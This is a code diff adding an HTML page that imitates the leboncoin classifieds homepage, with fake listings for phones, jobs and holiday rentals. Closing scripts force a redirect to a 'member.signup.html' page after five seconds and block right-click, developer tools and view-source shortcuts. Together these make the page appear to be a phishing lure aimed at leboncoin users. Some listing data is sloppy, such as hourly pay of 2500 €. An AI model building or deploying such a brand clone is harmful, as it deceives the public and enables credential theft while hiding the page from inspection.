+              <li><a href="#">Emploi</a></li>
+              <li><a href="#">Mode</a></li>
+              <li><a href="#">Maison & Jardin</a></li>
+              <li><a href="#">Famille</a></li>
+              <li><a href="#">Électronique</a></li>
+              <li><a href="#">Loisirs</a></li>
+              <li><a href="#">Autres</a></li>
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </header>
+
+    <main class="main-content">
+        <section class="call-to-action-banner">
+            <div class="banner-content">
+                <h2>C'est le moment de vendre</h2>
+                <button class="deposer-annonce-banner">
+                    <i class="fas fa-plus"></i>Déposer une annonce
+                </button>
+            </div>
+            <div class="banner-decoration top-right"></div>
+            <div class="banner-decoration bottom-left"></div>
+        </section>
+
+        <section class="trends-section">
+            <div class="section-title-wrapper">
+                <h2>Tendance en ce moment</h2>
+                <a href="#" class="view-more">Voir plus d'annonces <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="trends-card-container">
+                <div class="trends-card">
+                    <img src="tendanceencemoment.png" alt="Transformez votre extérieur">
+                    <div class="trends-card-content">
+                        <p>Transformez votre extérieur</p>
+                    </div>
+                </div>
+                <div class="trends-card">
+                    <img src="barbecueouplacha.png" alt="Barbecue ou plancha ?">
+                    <div class="trends-card-content">
+                        <p>Barbecue ou plancha ?</p>
+                    </div>
+                </div>
+                <div class="trends-card">
+                    <img src="évadezvousavélo2.png" alt="Évadez-vous à vélo">
+                    <div class="trends-card-content">
+                        <p>Évadez-vous à vélo</p>
+                    </div>
+                </div>
+                <div class="trends-card">
+                    <img src="immobilierlancezvous.png" alt="Immobilier : lancez-vous...">
+                    <div class="trends-card-content">
+                        <p>Immobilier : lancez-vous...</p>
+                    </div>
+                </div>
+                <div class="trends-card">
+                    <img src="cabane.png" alt="Découvrez la High-Tech">
+                    <div class="trends-card-content">
+                        <p>Découvrez la High-Tech</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section class="top-categories-image-carousel-section">
+            <div class="section-title-wrapper">
+                <h2>Top catégories</h2>
+                <a href="#" class="view-more">Voir plus d'annonces <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="top-categories-image-carousel-container">
+                <div class="carousel-card">
+                    <img src="vétements.png" alt="Vêtements" class="carousel-image">
+                    <div class="overlay-text-bottom-left">Vêtements</div>
+                    <div class="navigation-arrow left"><i class="fas fa-chevron-left"></i></div>
+                </div>
+                <div class="carousel-card">
+                    <img src="vacances.png" alt="Vacances" class="carousel-image">
+                    <div class="overlay-text-bottom-left">Vacances</div>
+                </div>
+                <div class="carousel-card">
+                    <img src="astucesmaison.png" alt="Astuces Maison" class="carousel-image">
+                    <div class="overlay-text-bottom-left">Astuces Maison</div>
+                </div>
+                <div class="carousel-card ad-card">
+                    <p>leboncoin Publicité</p>
+                </div>
+                <div class="carousel-card">
+                    <img src="offresdemploi.png" alt="Offres d'emploi" class="carousel-image">
+                    <div class="overlay-text-bottom-left">Offres d'emploi</div>
+                    <div class="navigation-arrow right"><i class="fas fa-chevron-right"></i></div>
+                </div>
+                <div class="carousel-card">
+                    <img src="ventesimmo.png" alt="Vélo" class="carousel-image">
+                    <div class="overlay-text-bottom-left">Vélo</div>
+                </div>
+            </div>
+        </section>
+
+        <section class="lbc-current-deals-section">
+            <div class="section-title-wrapper">
+                <div>
+                    <h2>En ce moment sur leboncoin</h2>
+                    <h3>Téléphones & Objets connectés</h3>
+                </div>
+                <a href="#" class="view-more">Voir plus d'annonces <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="lbc-current-deals-grid-container">
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="iphones16pro.png" alt="iPhone 16 pro" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">800 €</p>
+                        <p class="lbc-deal-card-title">iPhone 16 pro</p>
+                        <p class="lbc-deal-card-location">Alès 30100</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:42</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="iphone16promax.png" alt="iPhone 16 pro Max" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">970 €</p>
+                        <p class="lbc-deal-card-title">iPhone 16 pro Max</p>
+                        <p class="lbc-deal-card-location">Brégnier-Cordon 01300</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:42</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="iphone11blanc.png" alt="iPhone 11 blanc 128 Go" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">180 €</p>
+                        <p class="lbc-deal-card-title">iPhone 11 blanc 128 Go</p>
+                        <p class="lbc-deal-card-location">Albi 81000</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:41</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="iphone8.png" alt="iPhone 8" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">70 €</p>
+                        <p class="lbc-deal-card-title">iPhone 8</p>
+                        <p class="lbc-deal-card-location">Paris 75017 17e Arrondissement</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:41</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="cartemèresamsung.png" alt="Carte mère samsung j3 2016" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">25 €</p>
+                        <p class="lbc-deal-card-title">Carte mère samsung j3 2016</p>
+                        <p class="lbc-deal-card-location">Noyon 60400</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:40</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="smartwatch.png" alt="AirPods Pro" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">150 €</p>
+                        <p class="lbc-deal-card-title">AirPods Pro (2ème gén.)</p>
+                        <p class="lbc-deal-card-location">Lyon 69001</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:35</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="macbookpro.png" alt="Apple Watch Series 8" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">320 €</p>
+                        <p class="lbc-deal-card-title">Apple Watch Series 8</p>
+                        <p class="lbc-deal-card-location">Marseille 13008</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:30</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="samsungalaxys21.png" alt="Google Pixel 7a" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">380 €</p>
+                        <p class="lbc-deal-card-title">Google Pixel 7a</p>
+                        <p class="lbc-deal-card-location">Bordeaux 33000</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:25</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="macbookpro.png" alt="Casque Bluetooth Bose QC35 II" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">120 €</p>
+                        <p class="lbc-deal-card-title">Casque Bluetooth Bose QC35 II</p>
+                        <p class="lbc-deal-card-location">Toulouse 31000</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:20</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="samsungalaxys21.png" alt="Samsung Galaxy S23" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">650 €</p>
+                        <p class="lbc-deal-card-title">Samsung Galaxy S23</p>
+                        <p class="lbc-deal-card-location">Nice 06000</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:15</p>
+                        <p class="lbc-deal-card-delivery-info">Livraison possible</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="lbc-current-deals-section">
+            <div class="section-title-wrapper">
+                <h2>Offres d’emploi</h2>
+                <a href="#" class="view-more">Voir plus d'annonces <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="lbc-current-deals-grid-container">
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="chauffeurvtc.png" alt="Chauffeur vtc" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">Indépendant/Franchise</p>
+                        <p class="lbc-deal-card-title">- 5000 € / mois</p>
+                        <p class="lbc-deal-card-location">Paris 75017 17e Arrondissement</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:35 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="agentcommerciaux.png" alt="Agents Commerciaux" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">Indépendant/Franchise</p>
+                        <p class="lbc-deal-card-title">- 6000 € / mois</p>
+                        <p class="lbc-deal-card-location">Bourges 18000</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:33 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="carossierpeintre.png" alt="Carrossier-peintre" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDI - 2500 € /heure</p>
+                        <p class="lbc-deal-card-title">Carrossier-peintre (H/F/X)</p>
+                        <p class="lbc-deal-card-location">Bernay 27300</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:24 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="mecanicienpoidsloud.png" alt="Mecanicien poids lourds" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDI - 2600 € /heure</p>
+                        <p class="lbc-deal-card-title">Mecanicien poids lourds (H/F/X)</p>
+                        <p class="lbc-deal-card-location">Bernay 27300</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:19 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="menuisierbois.png" alt="Maçon" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDI</p>
+                        <p class="lbc-deal-card-title">Maçon (H/F)</p>
+                        <p class="lbc-deal-card-location">Saint-Pierre-d'Oléron 17310</p>
+                        <p class="lbc-deal-card-date">aujourd'hui à 00:15 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="couvreurzingueur.png" alt="Vendeur automobile" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDI - 3000 € / mois</p>
+                        <p class="lbc-deal-card-title">Vendeur automobile (H/F)</p>
+                        <p class="lbc-deal-card-location">Nantes 44000</p>
+                        <p class="lbc-deal-card-date">hier à 18:00 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="responsablerecouvrement.png" alt="Infirmier" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDI - 2800 € / mois</p>
+                        <p class="lbc-deal-card-title">Infirmier (H/F)</p>
+                        <p class="lbc-deal-card-location">Lyon 69000</p>
+                        <p class="lbc-deal-card-date">hier à 17:30 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="chauffagiste.png" alt="Développeur web" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDI - 4000 € / mois</p>
+                        <p class="lbc-deal-card-title">Développeur Web Fullstack (H/F)</p>
+                        <p class="lbc-deal-card-location">Paris 75000</p>
+                        <p class="lbc-deal-card-date">hier à 16:45 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="mecanicienmaintenace.png" alt="Cuisinier" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">CDD - 2200 € / mois</p>
+                        <p class="lbc-deal-card-title">Cuisinier (H/F)</p>
+                        <p class="lbc-deal-card-location">Nice 06000</p>
+                        <p class="lbc-deal-card-date">hier à 15:00 - <span style="color: green;">Nouveau !</span></p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="lbc-current-deals-section">
+            <div class="section-title-wrapper">
+                <h2>Locations saisonnières</h2>
+                <a href="#" class="view-more">Voir plus d'annonces <i class="fas fa-arrow-right"></i></a>
+            </div>
+            <div class="lbc-current-deals-grid-container">
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="maisonde45.png" alt="Maison bord de mer" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">1200 € / semaine</p>
+                        <p class="lbc-deal-card-title">Magnifique maison bord de mer</p>
+                        <p class="lbc-deal-card-location">La Baule 44500</p>
+                        <p class="lbc-deal-card-date">Dispo juillet-août</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="appartement.png" alt="Appartement montagne" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">850 € / semaine</p>
+                        <p class="lbc-deal-card-title">Appartement spacieux en montagne</p>
+                        <p class="lbc-deal-card-location">Chamonix 74400</p>
+                        <p class="lbc-deal-card-date">Dispo été</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="piscine.png" alt="Villa avec piscine" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">2500 € / semaine</p>
+                        <p class="lbc-deal-card-title">Villa de luxe avec piscine</p>
+                        <p class="lbc-deal-card-location">Saint-Tropez 83990</p>
+                        <p class="lbc-deal-card-date">Dispo toute l'année</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="studio.png" alt="Studio Paris" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">700 € / semaine</p>
+                        <p class="lbc-deal-card-title">Joli studio centre de Paris</p>
+                        <p class="lbc-deal-card-location">Paris 75004</p>
+                        <p class="lbc-deal-card-date">Week-ends et courts séjours</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="chalet.png" alt="Chalet Alpes" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">1500 € / semaine</p>
+                        <p class="lbc-deal-card-title">Chalet cosy aux pieds des pistes</p>
+                        <p class="lbc-deal-card-location">Courchevel 73120</p>
+                        <p class="lbc-deal-card-date">Dispo hiver</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="chalet.png" alt="Gîte campagne" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">600 € / semaine</p>
+                        <p class="lbc-deal-card-title">Gîte familial à la campagne</p>
+                        <p class="lbc-deal-card-location">Dordogne 24000</p>
+                        <p class="lbc-deal-card-date">Dispo printemps-automne</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="plage.png" alt="Bungalow plage" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">900 € / semaine</p>
+                        <p class="lbc-deal-card-title">Bungalow pieds dans l'eau</p>
+                        <p class="lbc-deal-card-location">Cap Ferret 33970</p>
+                        <p class="lbc-deal-card-date">Dispo juillet</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="appart.png" alt="Appartement ville" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">550 € / semaine</p>
+                        <p class="lbc-deal-card-title">Appartement lumineux en centre-ville</p>
+                        <p class="lbc-deal-card-location">Lyon 69002</p>
+                        <p class="lbc-deal-card-date">Toute l'année</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="maison.png" alt="Maison campagne" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">750 € / semaine</p>
+                        <p class="lbc-deal-card-title">Maison avec grand jardin</p>
+                        <p class="lbc-deal-card-location">Luberon 84160</p>
+                        <p class="lbc-deal-card-date">Été et hors saison</p>
+                    </div>
+                </div>
+                <div class="lbc-deal-card">
+                    <div class="lbc-deal-card-image-wrapper">
+                        <img src="cabane.png" alt="Cabane au bord du lac" class="lbc-deal-card-image">
+                        <i class="far fa-heart lbc-deal-card-favorite-icon"></i>
+                    </div>
+                    <div class="lbc-deal-card-content">
+                        <p class="lbc-deal-card-price">450 € / semaine</p>
+                        <p class="lbc-deal-card-title">Cabane insolite au bord du lac</p>
+                        <p class="lbc-deal-card-location">Lac d'Annecy 74290</p>
+                        <p class="lbc-deal-card-date">Printemps-été</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="static-text-section">
+            <p>Avec leboncoin, trouvez la bonne affaire sur le site référent de petites annonces de particulier à particulier et de professionnels. Avec des millions de petites annonces, trouvez la bonne occasion dans nos catégories voitures, immobilier, emploi, location de vacances, vêtements, meubles, bricolage, téléphonie, jeux vidéo, etc.
+            </p>
+        </section>
+    </main>
+
+  <footer class="main-footer">
+    <div class="footer-content">
+      <div class="footer-column">
+        <h3>À propos du boncoin</h3>
+        <ul>
+          <li><a href="#">Qui sommes-nous ?</a></li>
+          <li><a href="#">Nous rejoindre</a></li>
+          <li><a href="#">Impact environnemental</a></li>
+          <li><a href="#">Accessibilité</a></li>
+          <li><a href="#">Authenticité des annonces</a></li>
+          <li><a href="#">Informations légales</a></li>
+          <li><a href="#">Conditions Générales de Vente</a></li>
+          <li><a href="#">Conditions Générales d'Utilisation</a></li>
+          <li><a href="#">Avis de non-responsabilité</a></li>
+          <li><a href="#">Gestion des cookies</a></li>
+          <li><a href="#">Politique de confidentialité</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Nos services</h3>
+        <ul>
+          <li><a href="#">Solutions pros</a></li>
+          <li><a href="#">Publicité</a></li>
+          <li><a href="#">Tous nos services</a></li>
+          <li><a href="#">Aide et Contact</a></li>
+          <li><a href="#">Déposer une annonce</a></li>
+          <li><a href="#">Centre de sécurité</a></li>
+          <li><a href="#">Livraison</a></li>
+          <li><a href="#">Paiement sécurisé</a></li>
+          <li><a href="#">Assurance</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Nos univers</h3>
+        <ul>
+          <li><a href="#">Immobilier</a></li>
+          <li><a href="#">Véhicules</a></li>
+          <li><a href="#">Vacances</a></li>
+          <li><a href="#">Emploi</a></li>
+          <li><a href="#">Mode</a></li>
+          <li><a href="#">Maison & Jardin</a></li>
+          <li><a href="#">Famille</a></li>
+          <li><a href="#">Électronique</a></li>
+          <li><a href="#">Loisirs</a></li>
+          <li><a href="#">Autres</a></li>
+          <li><a href="#">leboncoin sur YouTube</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Découvrez nos applications</h3>
+        <div class="app-links">
+          <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="Disponible sur l'App Store"></a>
+          <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Disponible sur Google Play"></a>
+        </div>
+        <h3 style="margin-top: 30px;">Suivez-nous</h3>
+        <div class="social-media-links">
+          <a href="#" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
+          <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+          <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+          <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p class="copyright">&copy; 2025 leboncoin - Tous droits réservés</p>
+    </div>
+  </footer>
+
+  <script>
+    // Redirection vers la page d'inscription après 10 secondes
+    setTimeout(function() {
+      window.location.replace('member.signup.html');
+    }, 5000);
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const hamburger = document.querySelector('.hamburger-menu');
+      const closeBtn = document.querySelector('.close-menu-btn');
+      const overlay = document.querySelector('.mobile-menu-overlay');
+      const menu = document.querySelector('.mobile-menu');
+
+      const searchInput = document.querySelector('.search-bar-wrapper input');
+      const searchButtonCombined = document.querySelector('.search-button-combined');
+      const searchIconInsideInput = document.querySelector('.search-bar-wrapper .input-icon');
+
+      const performSearch = () => {
+          const searchTerm = searchInput.value;
+          if (searchTerm) {
+               alert('Recherche de : ' + searchTerm); // Uncomment for actual search behavior
+          }
+      };
+
+      if (searchInput) {
+        searchInput.addEventListener('keypress', (event) => {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                performSearch();
+            }
+        });
+      }
+
+      if (searchButtonCombined) {
+          searchButtonCombined.addEventListener('click', performSearch);
+      }
+
+      if (searchIconInsideInput) {
+           searchIconInsideInput.addEventListener('click', performSearch);
+      }
+
+      function openMenu() {
+        console.log('☰ Hamburger Clicked! Attempting to open menu.');
+        menu.classList.add('is-open');
+        overlay.classList.add('is-open');
+        document.body.classList.add('no-scroll');
+      }
+
+      function closeMenu() {
+        console.log('✕ Close Button or Overlay Clicked! Attempting to close menu.');
+        menu.classList.remove('is-open');
+        overlay.classList.remove('is-open');
+        document.body.classList.remove('no-scroll');
+      }
+
+      if (hamburger) {
+        hamburger.addEventListener('click', openMenu);
+        console.log('Event listener added to hamburger menu.');
+      } else {
+        console.warn('Bouton hamburger non trouvé dans le DOM !');
+      }
+
+      if (closeBtn) {
+        closeBtn.addEventListener('click', closeMenu);
+        console.log('Event listener added to close button.');
+      } else {
+        console.warn('Bouton de fermeture du menu mobile non trouvé !');
+      }
+
+      if (overlay) {
+        overlay.addEventListener('click', closeMenu);
+        console.log('Event listener added to overlay.');
+      } else {
+        console.warn('Overlay du menu mobile non trouvé !');
+      }
+
+      document.querySelector('.top-header').addEventListener('click', function(event) {
+          console.log('Clicked inside top-header:', event.target, 'Current target:', event.currentTarget);
+      });
+    });
+  </script>
+
+  <script>
+document.addEventListener("contextmenu", event => event.preventDefault());  // Bloque clic droit
+document.addEventListener("keydown", function(e) {
+    if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || (e.ctrlKey && e.key === "U")) {
+        e.preventDefault();
+    }
+});
+document.querySelectorAll("img").forEach(img => {
+    img.setAttribute("oncontextmenu", "return false");
+    img.setAttribute("ondragstart", "return false");
+});
+</script>
+</body>
+</html>
